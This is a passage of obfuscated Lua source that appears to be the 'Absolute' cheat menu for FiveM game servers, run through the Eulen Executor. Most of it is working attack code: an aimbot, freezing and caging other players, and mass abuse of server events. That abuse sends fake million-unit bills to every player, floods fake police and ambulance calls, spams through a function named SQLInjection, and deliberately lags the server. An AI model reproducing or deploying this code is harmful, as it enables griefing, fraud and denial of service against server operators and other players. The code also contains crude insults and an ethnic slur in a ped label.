                    sQ8czrn6VqAcYv.b
                )
                SetVehicleCustomSecondaryColour(
                    GetVehiclePedIsUsing(PlayerPedId(-1)),
                    sQ8czrn6VqAcYv.r,
                    sQ8czrn6VqAcYv.g,
                    sQ8czrn6VqAcYv.b
                )
            end
            if RainbowNeon then
                local XFo20cbEniflQjIQwiu_ = zUoMrrZq5DQFtPp5FZLyK(1)
                RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0.0))
                SetVehicleNeonLightsColour(
                    GetVehiclePedIsUsing(PlayerPedId(-1)),
                    XFo20cbEniflQjIQwiu_.r,
                    XFo20cbEniflQjIQwiu_.g,
                    XFo20cbEniflQjIQwiu_.b
                )
                for i = -1, 12 do
                    SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
                end
            end
            function SpectateUser(q6kc8ViHmRlM8ZBpO)
                isSpectatingTarget = not isSpectatingTarget
                local vIRjpip3icSGrv5V = GetPlayerPed(q6kc8ViHmRlM8ZBpO)
                if isSpectatingTarget then
                    local v9Bo2_iHq8eLChkN, cfVB, LbrfJbR1n3sOiMVS =
                        table.unpack(GetEntityCoords(vIRjpip3icSGrv5V, false))
                    RequestCollisionAtCoord(v9Bo2_iHq8eLChkN, cfVB, LbrfJbR1n3sOiMVS)
                    NetworkSetInSpectatorMode(true, vIRjpip3icSGrv5V)
                    RequestCollisionAtCoord(GetEntityCoords(vIRjpip3icSGrv5V))
                    NetworkSetInSpectatorMode(true, vIRjpip3icSGrv5V)
                    I0oW9H("Started spectating ~o~" .. GetPlayerName(q6kc8ViHmRlM8ZBpO))
                else
                    local DS6PLo_AP6, aNrMdCHL4, SI7dMy = table.unpack(GetEntityCoords(vIRjpip3icSGrv5V, false))
                    RequestCollisionAtCoord(DS6PLo_AP6, aNrMdCHL4, SI7dMy)
                    NetworkSetInSpectatorMode(false, vIRjpip3icSGrv5V)
                    I0oW9H("Stopped spectating ~o~" .. GetPlayerName(q6kc8ViHmRlM8ZBpO))
                end
            end
            function GetDistance(__s6AnnckvSfF5Pkg, OSzgfoczWPttXU91Q0oJ1)
                local fR_cbwkSkSTtpYsb5OhM = __s6AnnckvSfF5Pkg.x
                local rGVdVirsrl2 = __s6AnnckvSfF5Pkg.y
                local ynvUQ2DZattr7iBagn = __s6AnnckvSfF5Pkg.z
                local X6TM = OSzgfoczWPttXU91Q0oJ1.x
                local SqRzHm1B4nzrT04C = OSzgfoczWPttXU91Q0oJ1.y
                local GsItgAxbDNoO9Ewdf = OSzgfoczWPttXU91Q0oJ1.z
                local YLddjiNGS5Hfv2XLS4 = X6TM - fR_cbwkSkSTtpYsb5OhM
                local hYyHqU = SqRzHm1B4nzrT04C - rGVdVirsrl2
                local ZHsq9fGJt = GsItgAxbDNoO9Ewdf - ynvUQ2DZattr7iBagn
                local MC2h = hYyHqU * hYyHqU
                local tFWH_HOqG3nMIOUOm = YLddjiNGS5Hfv2XLS4 * YLddjiNGS5Hfv2XLS4
                local R1u = MC2h + tFWH_HOqG3nMIOUOm
                return math.sqrt(R1u + ZHsq9fGJt)
            end
            function rotDirection(vAf7prMC)
                local zfd49raoyXF_q1zRl = vAf7prMC.z * 0.0174532924
                local bV6vi478VMAsu897ywesS = vAf7prMC.x * 0.0174532924
                local Xf8YoSDJgKDA = math.abs(math.cos(bV6vi478VMAsu897ywesS))
                local RSawvwryp5bZJr =
                    vector3(
                    -math.sin(zfd49raoyXF_q1zRl) * Xf8YoSDJgKDA,
                    math.cos(zfd49raoyXF_q1zRl) * Xf8YoSDJgKDA,
                    math.sin(bV6vi478VMAsu897ywesS)
                )
                return RSawvwryp5bZJr
            end
            function multiply(RBVzHxcMYfAH4dNczM6, m1lffq78h)
                local ZoHnsqGzqu0h2eA7X =
                    vector3(
                    RBVzHxcMYfAH4dNczM6.x * m1lffq78h,
                    RBVzHxcMYfAH4dNczM6.y * m1lffq78h,
                    RBVzHxcMYfAH4dNczM6.z * m1lffq78h
                )
                return ZoHnsqGzqu0h2eA7X
            end
            function add(Ia, T)
                local _ = vector3(Ia.x + T.x, Ia.y + T.y, Ia.z + T.z)
                return _
            end
            if GTAOAmmo then
                local lCrFQaJxA7 = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                local QVOQ6xg = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                lCrFQaJxA7 = lCrFQaJxA7 + 0.25
                QVOQ6xg = QVOQ6xg + nlXCUGaxh(1000)
                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local PMOD2 = GetHashKey(Hm_I[selectedTypeAmmo])
                    if not HasWeaponAssetLoaded(PMOD2) then
                        RequestWeaponAsset(PMOD2, 31, false)
                        while not HasWeaponAssetLoaded(PMOD2) do
                            Citizen.Wait(0.0)
                        end
                    end
                    ShootSingleBulletBetweenCoords(
                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0.0)), lCrFQaJxA7)).x,
                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0.0)), lCrFQaJxA7)).y,
                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0.0)), lCrFQaJxA7)).z,
                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0.0)), QVOQ6xg)).x,
                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0.0)), QVOQ6xg)).y,
                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0.0)), QVOQ6xg)).z,
                        250,
                        true,
                        PMOD2,
                        PlayerPedId(),
                        true,
                        false,
                        nlXCUGaxh(-1)
                    )
                end
            end
            function ChangeMyPed(x8lJLKm9ja8wSSmx)
                RequestModel(GetHashKey(x8lJLKm9ja8wSSmx))
                Wait(125)
                if HasModelLoaded(GetHashKey(x8lJLKm9ja8wSSmx)) then
                    SetPlayerModel(PlayerId(), GetHashKey(x8lJLKm9ja8wSSmx))
                end
            end
            function TeleportIntoPlayerVehicle(fEetZq31Hcge1YEcM)
                local EGE = GetPlayerPed(fEetZq31Hcge1YEcM)
                if not IsPedInAnyVehicle(EGE) then
                end
                local A86T_gfdk0mHgdkFK = GetVehiclePedIsUsing(GetPlayerPed(fEetZq31Hcge1YEcM))
                local gccjpDHuQz = GetVehicleMaxNumberOfPassengers(A86T_gfdk0mHgdkFK)
                for i = 0.0, gccjpDHuQz do
                    if IsVehicleSeatFree(A86T_gfdk0mHgdkFK, i) then
                        SetPedIntoVehicle(PlayerPedId(), A86T_gfdk0mHgdkFK, i)
                        break
                    end
                end
            end
            function table.removekey(R3F8LaUcpiYjSqT, cP)
                for i = 1, #R3F8LaUcpiYjSqT do
                    if R3F8LaUcpiYjSqT[i] == cP then
                        table.remove(R3F8LaUcpiYjSqT, i)
                    end
                end
            end
            function GetWeaponNameFromHash(hQZRCTLlh_lolyzBD5)
                for i = 1, #lEEdGdG3pKKZL5P7 do
                    if GetHashKey(lEEdGdG3pKKZL5P7[i]) == hQZRCTLlh_lolyzBD5 then
                        return string.sub(lEEdGdG3pKKZL5P7[i], 8)
                    end
                end
            end
            function DrawTxt(Z1Z40F, XGG3uf0kWGEOZc28f, TZcN, pTwcDIuXW1P, pidf5j, BTIBAuklqaw)
                SetTextColour(255, 128, 0.0, 255)
                SetTextFont(4)
                SetTextCentre()
                SetTextProportional(1)
                SetTextScale(pTwcDIuXW1P, pidf5j)
                SetTextDropshadow(0.0, 0.0, 0.0, 0.0, 255)
                SetTextEdge(2, 0.0, 0.0, 0.0, 255)
                SetTextDropShadow()
                SetTextOutline()
                SetTextEntry("STRING")
                AddTextComponentString(Z1Z40F)
                DrawText(XGG3uf0kWGEOZc28f, TZcN)
            end
            function ClonePedFromPlayer(TD)
                local lPq = GetPlayerPed(TD)
                ClonePed(lPq, 1, 1, 1)
            end
            function Attackers1(cq8V3LGKcZn3lrWuZHpy)
            end
            if PlayerFreeze then
                FlackoSucks = true
            else
                FlackoSucks = false
            end
            Citizen.CreateThread(
                function()
                    while FlackoSucks do
                        Citizen.Wait(200)
                        ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
                    end
                end
            )
            DisplayRadar(l3hynQvfI9D, 1)
            if AimLockTest then
                for i = 0.0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local vDiyfy6tbROlyqmOSbP = GetPlayerPed(i)
                            local meMUhEkpNoKgSDRcFVJNB = GetEntityCoords(vDiyfy6tbROlyqmOSbP)
                            local UI = DoesEntityExist(vDiyfy6tbROlyqmOSbP)
                            local Yu = IsPlayerDead(vDiyfy6tbROlyqmOSbP)
                            if UI and not Yu then
                                local Jc_oSioDbYx, FZk78QXSE, TZaoHGK7iMV5K3QErdsEp =
                                    World3dToScreen2d(
                                    meMUhEkpNoKgSDRcFVJNB.x,
                                    meMUhEkpNoKgSDRcFVJNB.y,
                                    meMUhEkpNoKgSDRcFVJNB.z,
                                    0.0
                                )
                                if IsEntityVisible(vDiyfy6tbROlyqmOSbP) and Jc_oSioDbYx then
                                    if HasEntityClearLosToEntity(PlayerPedId(), vDiyfy6tbROlyqmOSbP, 10000) then
                                        local lI7s426J8wWMk =
                                            GetPedBoneCoords(vDiyfy6tbROlyqmOSbP, 31086, 0.0, 0.0, 0.0)
                                        SetPedShootsAtCoord(
                                            PlayerPedId(),
                                            lI7s426J8wWMk.x,
                                            lI7s426J8wWMk.y,
                                            lI7s426J8wWMk.z,
                                            1
                                        )
                                    end
                                end
                            end
                        end
                    end
                end
            end
            if Absolute.IsMenuOpened("MainMenu") then
                if
                    Absolute.MenuButton(
                        "Self Options",
                        "SelfOptions",
                        "~o~>>",
                        {dict = "timerbars", text = "spikes", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Players List",
                        "PlayerList",
                        "~o~>>",
                        {dict = "mpleaderboard", text = "leaderboard_friends_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Teleport Options",
                        "TeleportMenu",
                        "~o~>>",
                        {
                            dict = "mpleaderboard",
                            text = "leaderboard_transport_plane_icon",
                            color = {r = 255, g = 255, b = 255}
                        }
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Vehicle Options",
                        "VehiclesMenu",
                        "~o~>>",
                        {dict = "mpleaderboard", text = "leaderboard_car_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Weapon Options",
                        "WeaponMenu",
                        "~o~>>",
                        {dict = "mpleaderboard", text = "leaderboard_kills_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Visual Options",
                        "VisualOptions",
                        "~o~>>",
                        {dict = "shared", text = "emptydot_32", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Menu Crasher",
                        "NukeWorld",
                        "~o~>>",
                        {dict = "timerbars", text = "rockets", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Recovery",
                        "Recovery",
                        "~o~>>",
                        {
                            dict = "mpleaderboard",
                            text = "leaderboard_socialclub_icon",
                            color = {r = 255, g = 255, b = 255}
                        }
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Craft Laboratory",
                        "CraftLaboratory",
                        "~o~>>",
                        {dict = "timerbars", text = "boost", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Menu Config",
                        "MenuSettings",
                        "~o~>>",
                        {dict = "commonmenutu", text = "survival", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("SelfOptions") then
                if
                    Absolute.MenuButton(
                        "Powers",
                        "Powers",
                        "~o~>>",
                        {dict = "commonmenutu", text = "custom_mission", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "K9 Menu",
                        "K9Menu",
                        "~o~>>",
                        {dict = "commonmenutu", text = "deathmatch", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Wardobe Maker",
                        "WardobeMaker",
                        "~o~>>",
                        {dict = "commonmenu", text = "shop_clothing_icon_a", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif Absolute.Button("Random Appareance") then
                    lRH(PlayerId())
                elseif
                    Absolute.ComboBox(
                        "Change Ped",
                        {
                            "Alien",
                            "Chimp",
                            "Drug Chef",
                            "Imponent Rage",
                            "Sylvester Stallone",
                            "Army Men",
                            "Jesus",
                            "Pigeon",
                            "Killer whale (use on ~b~water~w~)",
                            "Bunny",
                            "@Flacko",
                            "Juggernaut",
                            "@Manuel",
                            "@Cat",
                            "ChickenHawk",
                            "@Jesus Cook",
                            "@Nertigel"
                        },
                        currMyPedFuncIndex,
                        selMyPedFuncIndex,
                        function(ImgiaI96a, ee)
                            currMyPedFuncIndex = ImgiaI96a
                            selMyPedFuncIndex = ImgiaI96a
                        end
                    )
                 then
                    if selMyPedFuncIndex == 1 then
                        ChangeMyPed("s_m_m_movalien_01")
                    elseif selMyPedFuncIndex == 2 then
                        ChangeMyPed("a_c_chimp")
                    elseif selMyPedFuncIndex == 3 then
                        ChangeMyPed("ig_chef2")
                    elseif selMyPedFuncIndex == 4 then
                        ChangeMyPed("u_m_y_imporage")
                    elseif selMyPedFuncIndex == 5 then
                        ChangeMyPed("u_m_y_babyd")
                    elseif selMyPedFuncIndex == 6 then
                        ChangeMyPed("s_m_y_blackops_01")
                    elseif selMyPedFuncIndex == 7 then
                        ChangeMyPed("u_m_m_jesus_01")
                    elseif selMyPedFuncIndex == 8 then
                        ChangeMyPed("a_c_pigeon")
                    elseif selMyPedFuncIndex == 9 then
                        ChangeMyPed("a_c_killerwhale")
                    elseif selMyPedFuncIndex == 10 then
                        ChangeMyPed("a_c_rabbit_01")
                    elseif selMyPedFuncIndex == 11 then
                        ChangeMyPed("mp_m_weapexp_01")
                    elseif selMyPedFuncIndex == 12 then
                        ChangeMyPed("u_m_y_juggernaut_01")
                    elseif selMyPedFuncIndex == 13 then
                        ChangeMyPed("u_m_y_mani")
                    elseif selMyPedFuncIndex == 14 then
                        ChangeMyPed("a_c_cat_01")
                    elseif selMyPedFuncIndex == 15 then
                        ChangeMyPed("a_c_chickenhawk")
                    elseif selMyPedFuncIndex == 16 then
                        ChangeMyPed("mp_m_bogdangoon")
                    elseif selMyPedFuncIndex == 17 then
                        ChangeMyPed("a_m_y_hasjew_01")
                    end
                elseif
                    Absolute.ComboBoxSlider(
                        "Health",
                        HealthCBWords,
                        currHealthIndex,
                        selHealthIndex,
                        function(T, AQB_gpMa3ckVoL)
                            currHealthIndex = T
                            selHealthIndex = T
                            HealthMultiplier = HealthCB[T]
                            SetEntityHealth(PlayerPedId(-1), HealthMultiplier)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Armor",
                        ArmorCBWords,
                        currArmorIndex,
                        selArmorIndex,
                        function(Mhg5LaankBgDelYVAjL, x8rHOY70I8V)
                            currArmorIndex = Mhg5LaankBgDelYVAjL
                            selArmorIndex = Mhg5LaankBgDelYVAjL
                            ArmorMultiplier = ArmorCB[Mhg5LaankBgDelYVAjL]
                            SetPedArmour(PlayerPedId(-1), ArmorMultiplier)
                        end
                    )
                 then
                elseif Absolute.Button("Revive") then
                    StopScreenEffect("DeathFailOut")
                    SetEntityHealth(PlayerPedId(-1), 200)
                    ClearPedBloodDamage(GetPlayerPed(-1))
                    local mgLz5x5we = GetEntityCoords(GetPlayerPed(-1))
                    SetEntityCoordsNoOffset(
                        PlayerPedId(-1),
                        mgLz5x5we.x,
                        mgLz5x5we.y,
                        mgLz5x5we.z,
                        false,
                        false,
                        false,
                        true
                    )
                    NetworkResurrectLocalPlayer(mgLz5x5we.x, mgLz5x5we.y, mgLz5x5we.z, heading, true, false)
                    FuckerTriggerCustomEvent(false, "playerSpawned", mgLz5x5we.x, mgLz5x5we.y, mgLz5x5we.z)
                    ClearPedBloodDamage(PlayerPedId(-1))
                elseif Absolute.Button("Suicide") then
                    SetEntityHealth(PlayerPedId(-1), 0.0)
                    I0oW9H("You commited suicide")
                elseif Absolute.Button("Refill Stamina") then
                    RestorePlayerStamina(PlayerId(), nlXCUGaxh(1))
                    I0oW9H("Stamina reset")
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("K9Menu") then
                if
                    Absolute.ComboBox(
                        "General Options",
                        {"Spawn Dog", "Delete Dog", "Print Controls (F8)"},
                        currDogDeleteSpawnFuncIndex,
                        selDogDeleteSpawnFuncIndex,
                        function(gx3a0try5QporE6q7Bd, oQOx0ksLos_ey)
                            currDogDeleteSpawnFuncIndex = gx3a0try5QporE6q7Bd
                            selDogDeleteSpawnFuncIndex = gx3a0try5QporE6q7Bd
                        end
                    )
                 then
                    if selDogDeleteSpawnFuncIndex == 1 then
                        Canaine()
                    elseif selDogDeleteSpawnFuncIndex == 2 then
                        DeleteCanaine()
                    elseif selDogDeleteSpawnFuncIndex == 3 then
                        for i = -1, 30 do
                            BR_BkvC9lTdDDJ(" ")
                        end
                        BR_BkvC9lTdDDJ(
                            "======================================================================================================================="
                        )
                        BR_BkvC9lTdDDJ("  G: Follow/Stand dog")
                        BR_BkvC9lTdDDJ("  G + Aiming: Aim to objective and press 'G' to make the dog attack")
                        BR_BkvC9lTdDDJ("  Change model: Select model below to change it")
                        BR_BkvC9lTdDDJ("  H: Join/Leave vehicle")
                        BR_BkvC9lTdDDJ(
                            "======================================================================================================================="
                        )
                    end
                elseif
                    Absolute.ComboBox(
                        "Select Ped",
                        {"RottWeiler", "Sheeperd", "Golden Retriever", "Husky", "Lion"},
                        currDogPedFuncIndex,
                        selDogPedFuncIndex,
                        function(OtEmW_jsqZP, Gzr_Q9PB8CfEXyp3Rc2d)
                            currDogPedFuncIndex = OtEmW_jsqZP
                            selDogPedFuncIndex = OtEmW_jsqZP
                        end
                    )
                 then
                    if selDogPedFuncIndex == 1 then
                        SelectedDogModel = "a_c_rottweiler"
                    elseif selDogPedFuncIndex == 2 then
                        SelectedDogModel = "a_c_shepherd"
                    elseif selDogPedFuncIndex == 3 then
                        SelectedDogModel = "a_c_retriever"
                    elseif selDogPedFuncIndex == 4 then
                        SelectedDogModel = "a_c_husky"
                    elseif selDogPedFuncIndex == 5 then
                        SelectedDogModel = "a_c_mtlion"
                    end
                elseif
                    Absolute.ComboBox(
                        "Make Dog",
                        {"Sit", "Laydown", "Stand up"},
                        currDogAnimationFuncIndex,
                        selDogAnimationFuncIndex,
                        function(YLtb0tQYu4T5vugks0r2m, qYmv7r2kl3fkGcK_)
                            currDogAnimationFuncIndex = YLtb0tQYu4T5vugks0r2m
                            selDogAnimationFuncIndex = YLtb0tQYu4T5vugks0r2m
                        end
                    )
                 then
                    if selDogAnimationFuncIndex == 1 then
                        PlayAnimation("creatures@rottweiler@amb@world_dog_sitting@idle_a", "idle_b")
                    elseif selDogAnimationFuncIndex == 2 then
                        PlayAnimation("creatures@rottweiler@amb@sleep_in_kennel@", "sleep_in_kennel")
                    elseif selDogAnimationFuncIndex == 3 then
                        ClearPedTasksImmediately(dog)
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("MenuSettings") then
                if
                    Absolute.MenuButton(
                        "Menu Credits",
                        "Credits",
                        "~o~>>",
                        {dict = "timerbars", text = "boost", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.ComboBox(
                        "Menu X",
                        menuX,
                        currXmenuPos,
                        selXMenuPos,
                        function(A2, zbSVDr)
                            currXmenuPos = A2
                            selXMenuPos = zbSVDr
                            for i = 1, #ActivesMenus do
                                Absolute.SetMenuX(ActivesMenus[i], menuX[currXmenuPos])
                            end
                        end
                    )
                 then
                elseif
                    Absolute.ComboBox(
                        "Menu Y",
                        menuY,
                        currYMenuPos,
                        selYMenuPos,
                        function(_MmM8rxSfir5gVfqir, vLdqt8JqopTAeA53LmHh)
                            currYMenuPos = _MmM8rxSfir5gVfqir
                            selYMenuPos = vLdqt8JqopTAeA53LmHh
                            for i = 1, #ActivesMenus do
                                Absolute.SetMenuY(ActivesMenus[i], menuY[currYMenuPos])
                            end
                        end
                    )
                 then
                elseif Absolute.Button("Header 1") then
                elseif Absolute.Button("Header 2") then
                elseif Absolute.Button("Shut Down", "UNHOOKER") then
                    for i = -1, 30 do
                        BR_BkvC9lTdDDJ(" ")
                    end
                    BR_BkvC9lTdDDJ(
                        "==================================================================================================================================================="
                    )
                    BR_BkvC9lTdDDJ(" ")
                    BR_BkvC9lTdDDJ(" ")
                    BR_BkvC9lTdDDJ("                                            Thanks for using Eulen Executor <3 ~~ Ciastekbatak  " .. o)
                    BR_BkvC9lTdDDJ(" ")
                    BR_BkvC9lTdDDJ(" ")
                    BR_BkvC9lTdDDJ(
                        "==================================================================================================================================================="
                    )
                    if DoesEntityExist(spawned_ped) then
                        DeleteCanaine()
                    end
                    for i = 0.0, 3 do
                        RXx("core", "exp_water", GetPlayerPed(-1))
                    end
                    Enabled = false
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Credits") then
                if Absolute.Button("Eulen#1692 - Executor Dev") then
                elseif Absolute.Button("Ciastekbatak#5964 Menu Edit") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("NukeWorld") then
                if Absolute.CheckBox("Include Self", IncludeMeAtNukeWorld) then
                    IncludeMeAtNukeWorld = not IncludeMeAtNukeWorld
                elseif
                    Absolute.ComboBox(
                        "Block",
                        {"Legion Square", "Simeons", "Police"},
                        currZoneBlockerFuncIndex,
                        selZoneBlockerFuncIndex,
                        function(z5w4SdcuuKX0c, _26SvZ09nRKBUiIF)
                            currZoneBlockerFuncIndex = z5w4SdcuuKX0c
                            selZoneBlockerFuncIndex = z5w4SdcuuKX0c
                        end
                    )
                 then
                    if selZoneBlockerFuncIndex == 1 then
                        x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                        roundx = tonumber(string.format("%.2f", x))
                        roundy = tonumber(string.format("%.2f", y))
                        roundz = tonumber(string.format("%.2f", z))
                        local rgW_xsXQdzVRl = -145066854
                        RequestModel(rgW_xsXQdzVRl)
                        while not HasModelLoaded(rgW_xsXQdzVRl) do
                            Citizen.Wait(0.0)
                        end
                        local XT7Gmb3xb9FH2pUPg6 = CreateObject(rgW_xsXQdzVRl, 97.8, -993.22, 28.41, true, true, false)
                        local wrOK9H_8UIFpdOO = CreateObject(rgW_xsXQdzVRl, 247.08, -1027.62, 28.26, true, true, false)
                        local Wpwu = CreateObject(rgW_xsXQdzVRl, 274.51, -833.73, 28.25, true, true, false)
                        local D1a5YM5o9fPr = CreateObject(rgW_xsXQdzVRl, 291.54, -939.83, 27.41, true, true, false)
                        local NHEpU4Nl8nC3R1nyvM =
                            CreateObject(rgW_xsXQdzVRl, 143.88, -830.49, 30.17, true, true, false)
                        local OYc4NvaS_P = CreateObject(rgW_xsXQdzVRl, 161.97, -768.79, 29.08, true, true, false)
                        local C8yJGoZN = CreateObject(rgW_xsXQdzVRl, 151.56, -1061.72, 28.21, true, true, false)
                        SetEntityHeading(XT7Gmb3xb9FH2pUPg6, 39.79)
                        SetEntityHeading(wrOK9H_8UIFpdOO, 128.62)
                        SetEntityHeading(Wpwu, 212.1)
                        SetEntityHeading(D1a5YM5o9fPr, 179.22)
                        SetEntityHeading(NHEpU4Nl8nC3R1nyvM, 292.37)
                        SetEntityHeading(OYc4NvaS_P, 238.46)
                        SetEntityHeading(C8yJGoZN, 61.43)
                        FreezeEntityPosition(XT7Gmb3xb9FH2pUPg6, true)
                        FreezeEntityPosition(wrOK9H_8UIFpdOO, true)
                        FreezeEntityPosition(Wpwu, true)
                        FreezeEntityPosition(D1a5YM5o9fPr, true)
                        FreezeEntityPosition(NHEpU4Nl8nC3R1nyvM, true)
                        FreezeEntityPosition(OYc4NvaS_P, true)
                        FreezeEntityPosition(C8yJGoZN, true)
                    elseif selZoneBlockerFuncIndex == 2 then
                        x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                        roundx = tonumber(string.format("%.2f", x))
                        roundy = tonumber(string.format("%.2f", y))
                        roundz = tonumber(string.format("%.2f", z))
                        local YqEMHpp8Vm = -145066854
                        RequestModel(YqEMHpp8Vm)
                        while not HasModelLoaded(YqEMHpp8Vm) do
                            Citizen.Wait(0.0)
                        end
                        local in68jm_GF9 = CreateObject(YqEMHpp8Vm, -50.97, -1066.92, 26.52, true, true, false)
                        local Chrf5PhNvoE_5D = CreateObject(YqEMHpp8Vm, -63.86, -1099.05, 25.26, true, true, false)
                        local tsJudGMPTBHEmETZ6kH = CreateObject(YqEMHpp8Vm, -44.13, -1129.49, 25.07, true, true, false)
                        SetEntityHeading(in68jm_GF9, 160.59)
                        SetEntityHeading(Chrf5PhNvoE_5D, 216.98)
                        SetEntityHeading(tsJudGMPTBHEmETZ6kH, 291.74)
                        FreezeEntityPosition(in68jm_GF9, true)
                        FreezeEntityPosition(Chrf5PhNvoE_5D, true)
                        FreezeEntityPosition(tsJudGMPTBHEmETZ6kH, true)
                    elseif selZoneBlockerFuncIndex == 3 then
                        x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                        roundx = tonumber(string.format("%.2f", x))
                        roundy = tonumber(string.format("%.2f", y))
                        roundz = tonumber(string.format("%.2f", z))
                        local DjaV3xmNM9JVbSUReYiP = -145066854
                        RequestModel(DjaV3xmNM9JVbSUReYiP)
                        while not HasModelLoaded(DjaV3xmNM9JVbSUReYiP) do
                            Citizen.Wait(0.0)
                        end
                        local abN0du5z = CreateObject(DjaV3xmNM9JVbSUReYiP, 439.43, -965.49, 27.05, true, true, false)
                        local VP = CreateObject(DjaV3xmNM9JVbSUReYiP, 401.04, -1015.15, 27.42, true, true, false)
                        local bEynwcAqayJpqdgL =
                            CreateObject(DjaV3xmNM9JVbSUReYiP, 490.22, -1027.29, 26.18, true, true, false)
                        local QkQ_82jiiQBdla =
                            CreateObject(DjaV3xmNM9JVbSUReYiP, 491.36, -925.55, 24.48, true, true, false)
                        SetEntityHeading(abN0du5z, 130.75)
                        SetEntityHeading(VP, 212.63)
                        SetEntityHeading(bEynwcAqayJpqdgL, 340.06)
                        SetEntityHeading(pd4, 209.57)
                        FreezeEntityPosition(abN0du5z, true)
                        FreezeEntityPosition(VP, true)
                        FreezeEntityPosition(bEynwcAqayJpqdgL, true)
                        FreezeEntityPosition(QkQ_82jiiQBdla, true)
                    end
                elseif Absolute.Button("Cage all players") then
                    for i = IncludeSelfAtNukeWorld, 128 do
                        x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i)))
                        roundx = tonumber(string.format("%.2f", x))
                        roundy = tonumber(string.format("%.2f", y))
                        roundz = tonumber(string.format("%.2f", z))
                        local Kh6xNQdPrRYEO = "hei_prop_heist_apecrate"
                        local nBz_r68CY96M98 = GetHashKey(Kh6xNQdPrRYEO)
                        RequestModel(nBz_r68CY96M98)
                        while not HasModelLoaded(nBz_r68CY96M98) do
                            Citizen.Wait(0.0)
                        end
                        local LU_JD = CreateObject(nBz_r68CY96M98, roundx, roundy, roundz - 0.5, true, true, false)
                        SetEntityHeading(LU_JD, nlXCUGaxh(-90))
                        FreezeEntityPosition(LU_JD, true)
                    end
                elseif Absolute.CheckBox("Disable all players from vehicles", DisableVehs) then
                    DisableVehs = not DisableVehs
                elseif Absolute.Button("~g~ESX ~s~| Send bill everyone") then
                    if CheckIfResourceExist("esx_billing") then
                        local ko047uCbkudY51r4r = GetActivePlayers()
                        for i = IncludeSelfAtNukeWorld, #ko047uCbkudY51r4r do
                            for k = 0.0, 25 do
                                FuckerTriggerCustomEvent(
                                    true,
                                    "esx_billing:sendBill",
                                    GetPlayerServerId(i),
                                    "Absolute",
                                    "fuckerino your asserino",
                                    1000000
                                )
                            end
                        end
                    else
                        I0oW9H("Failure")
                    end
                elseif Absolute.Button("~g~ESX ~s~| GCP Spam Ambulance") then
                    for i = 0.0, 250 do
                        local VNeIa = GetEntityCoords(GetPlayerPed(i))
                        TriggerServerEvent("esx_addons_gcphone:startCall", "ambulance", "ouch!", VNeIa)
                    end
                elseif Absolute.Button("~g~ESX ~s~| GCP Spam police") then
                    for i = 0.0, 250 do
                        local XvY = GetEntityCoords(GetPlayerPed(i))
                        TriggerServerEvent("esx_addons_gcphone:startCall", "police", "ouch!", XvY)
                    end
                elseif Absolute.Button("~g~ESX ~s~| GCP Spam Mechanic") then
                    for i = 0.0, 250 do
                        local P4cE = GetEntityCoords(GetPlayerPed(i))
                        TriggerServerEvent("esx_addons_gcphone:startCall", "mecano", "ouch!", P4cE)
                    end
                    for i = 0.0, 250 do
                        local u7rORT = GetEntityCoords(GetPlayerPed(i))
                        TriggerServerEvent("esx_addons_gcphone:startCall", "mechanic", "ouch!", u7rORT)
                    end
                elseif Absolute.Button("Spam cmd") then
                    local qOC = kbinput("Message", " ", 100)
                    local i5F = kbinput("How Many Times?", " ", 100)
                    if qOC == " " then
                        qOC = "ABSOLUTE MENU WAS HERE, WITH LOVE"
                    end
                    if i5F == " " then
                        i5F = 100
                    end
                    for i = 1, i5F do
                        Citizen.Wait(50)
                        SQLInjection("esx:clientLog", qOC)
                    end
                elseif Absolute.Button("Try to laggy a little the sv") then
                    for i = 0.0, 250 do
                        for i = 0.0, 20 do
                            local OFzMFL4WcYwErjL = GetEntityCoords(GetPlayerPed(i))
                            TriggerServerEvent("esx_addons_gcphone:startCall", "mecano", "ouch!", OFzMFL4WcYwErjL)
                        end
                    end
                    for i = 0.0, 250 do
